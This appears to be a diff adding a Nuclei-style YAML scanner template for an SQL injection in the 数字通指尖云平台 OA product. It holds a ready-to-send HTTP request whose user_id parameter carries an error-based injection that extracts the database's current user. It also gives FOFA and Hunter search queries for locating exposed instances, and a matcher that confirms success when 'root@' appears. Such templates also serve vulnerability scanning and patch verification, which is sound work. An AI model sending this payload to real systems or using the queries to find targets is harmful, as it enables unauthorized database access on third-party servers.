@@ -1,0 +1,34 @@
+id: sztbj-time-sqli
+info:
+  name: 数字通指尖云平台 time - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://blog.csdn.net/qq_36334672/article/details/135822596
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="assets/8cca19ff/css/bootstrap-yii.css"
+    hunter-query: app.name="中科数字通 "
+  tags: sztbj,sqli,oa
+
+http:
+  - raw:
+      - |
+        GET /payslip/search/index/userid/time?PayslipUser%5Buser_id%5D=1%20AND%20(SELECT%201111%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER()%20AS%20NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)&&yt0 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: GOASESSID=i589f58naalabocmbidup7edl3
+        Upgrade-Insecure-Requests: 1
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'root@')
+        condition: and
